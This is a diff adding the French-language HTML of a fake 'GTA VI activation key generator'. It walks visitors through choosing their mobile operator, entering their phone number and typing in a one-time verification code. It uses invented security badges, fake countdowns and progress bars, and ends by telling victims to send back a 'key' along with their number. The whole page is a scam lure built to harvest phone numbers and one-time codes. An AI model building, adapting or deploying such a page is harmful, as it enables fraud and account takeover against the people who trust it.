@@ -1,0 +1,129 @@
+
+<div class="stage">
+  <div class="glow g1"></div><div class="glow g2"></div><div class="noise"></div>
+  <div class="app">
+    <header>
+      <div class="brand">
+        <div class="bm">VI</div>
+        <div class="bt"><strong>GRAND THEFT AUTO VI</strong><span>Générateur de clé d'activation</span></div>
+      </div>
+      <div class="trust"><i class="pulse"></i> Session sécurisée · Chiffrement SSL 256 bits</div>
+      <div class="steps">
+        <div class="sline"><i id="fill"></i></div>
+        <div class="st" data-s="1"><b>1</b><span>Opérateur</span></div>
+        <div class="st" data-s="2"><b>2</b><span>Numéro</span></div>
+        <div class="st" data-s="3"><b>3</b><span>Vérif.</span></div>
+        <div class="st" data-s="4"><b>4</b><span>Clé</span></div>
+      </div>
+    </header>
+
+    <main>
+      <section class="screen on" id="s1">
+        <p class="kick">Étape 1 sur 4</p>
+        <h1>Votre opérateur</h1>
+        <p class="sub">Sélectionnez l'opérateur de la ligne à activer.</p>
+        <div class="ops">
+          <button class="op" data-op="SFR"><span class="lg sfr">SFR</span><span class="om"><strong>SFR</strong><small>Réseau SFR</small></span><i class="tk">✓</i></button>
+          <button class="op" data-op="Orange"><span class="lg org">ORA</span><span class="om"><strong>Orange</strong><small>Réseau Orange</small></span><i class="tk">✓</i></button>
+          <button class="op" data-op="Bouygues"><span class="lg bou">B&amp;Y</span><span class="om"><strong>Bouygues</strong><small>Réseau Bouygues Telecom</small></span><i class="tk">✓</i></button>
+        </div>
+        <button class="btn" id="b1" disabled="">Continuer</button>
+      </section>
+
+      <section class="screen" id="s2">
+        <p class="kick">Étape 2 sur 4</p>
+        <h1>Votre numéro</h1>
+        <p class="sub">La ligne doit être active pour recevoir la validation.</p>
+        <div class="field" id="fw">
+          <span class="pre">+33</span>
+          <input id="phone" type="tel" inputmode="numeric" autocomplete="tel-national" placeholder="6 12 34 56 78" maxlength="14">
+        </div>
+        <p class="hint">Format attendu : 06 12 34 56 78 — saisie sans le zéro.</p>
+        <p class="err" id="e2"></p>
+        <button class="btn" id="b2">Recevoir le code de vérification</button>
+        <button class="btn ghost sm" id="back2">Retour</button>
+      </section>
+
+      <section class="screen" id="s3">
+        <div class="center">
+          <p class="kick">Étape 3 sur 4</p>
+          <h1>Validation de la ligne</h1>
+          <p class="sub">Vérification de votre éligibilité auprès de l'opérateur. Un code de vérification vous sera ensuite demandé.</p>
+          <div class="ring">
+            <svg width="150" height="150">
+              <circle cx="75" cy="75" r="66" fill="none" stroke="rgba(255,255,255,.08)" stroke-width="6"></circle>
+              <circle id="r1" cx="75" cy="75" r="66" fill="none" stroke="#F6E3A8" stroke-width="6" stroke-linecap="round" stroke-dasharray="414.7" stroke-dashoffset="0"></circle>
+            </svg>
+            <div class="val"><b id="t1">60</b><small>secondes</small></div>
+          </div>
+          <p class="msg" id="m1">Contrôle du numéro en cours…</p>
+          <p class="hint">Ne fermez pas cette page. La session reprend automatiquement.</p>
+        </div>
+      </section>
+
+      <section class="screen" id="s4">
+        <p class="kick">Étape 3 sur 4</p>
+        <h1>Votre code de vérification</h1>
+        <p class="sub">Saisissez le code à 6 caractères qui vous a été transmis.</p>
+        <div class="field" id="cw">
+          <input id="vcode" inputmode="text" autocomplete="one-time-code" placeholder="• • • • • •" maxlength="8">
+        </div>
+        <p class="hint">Code transmis après confirmation de votre numéro par l'organisateur.</p>
+        <p class="err" id="e4"></p>
+        <button class="btn" id="b4">Valider mon code</button>
+      </section>
+
+      <section class="screen" id="s5">
+        <p class="kick">Étape 4 sur 4</p>
+        <h1>Tout est prêt</h1>
+        <p class="sub">Votre ligne est vérifiée. Générez maintenant votre clé d'activation GTA 6.</p>
+        <div class="recap">
+          <div class="row"><span>Opérateur</span><span id="rOp">—</span></div>
+          <div class="row"><span>Numéro</span><span id="rPh">—</span></div>
+          <div class="row"><span>Code vérifié</span><span id="rCd">—</span></div>
+          <div class="row"><span>Dossier</span><span id="rId">—</span></div>
+        </div>
+        <button class="btn" id="b5">Générer mon code d'activation GTA 6</button>
+        <p class="hint center-hint">Génération sécurisée · environ 5 minutes</p>
+      </section>
+
+      <section class="screen" id="s6">
+        <div class="center">
+          <p class="kick">Génération en cours</p>
+          <h1>Attribution de votre clé</h1>
+          <p class="sub">Une clé non utilisée est réservée puis signée pour votre dossier. Temps estimé : 5 minutes.</p>
+          <div class="bar"><i id="pb"></i></div>
+          <p class="msg" id="m2">Initialisation du module de génération…</p>
+          <p class="hint mono" id="t2">05:00</p>
+          <p class="hint">Ne fermez pas cette page. La génération reprend automatiquement au retour.</p>
+        </div>
+      </section>
+
+      <section class="screen" id="s7">
+        <div class="center">
+          <p class="kick">Activation prête</p>
+          <h1>Votre clé d'activation</h1>
+          <p class="sub">Clé unique attribuée à votre dossier. Conservez-la.</p>
+        </div>
+        <div class="keybox">
+          <p class="kl">Clé d'activation GTA 6</p>
+          <p class="key" id="keyTxt">—</p>
+        </div>
+        <button class="btn" id="copy">Copier la clé</button>
+        <p class="note"><b>Important :</b> transmettez cette clé accompagnée de votre numéro. Elle contient un <b>X</b> et n'est valable que pour un seul dossier.</p>
+        <div class="recap">
+          <div class="row"><span>Opérateur</span><span id="kOp">—</span></div>
+          <div class="row"><span>Numéro</span><span id="kPh">—</span></div>
+        </div>
+        <button class="btn ghost sm" id="again">Nouvelle activation</button>
+      </section>
+    </main>
+
+    <footer><span>Module d'activation GTA 6</span><span>SSL · <b id="fid">—</b></span></footer>
+  </div>
+</div>
+<div class="toast" id="toast">Clé copiée</div>
+
+
+
+
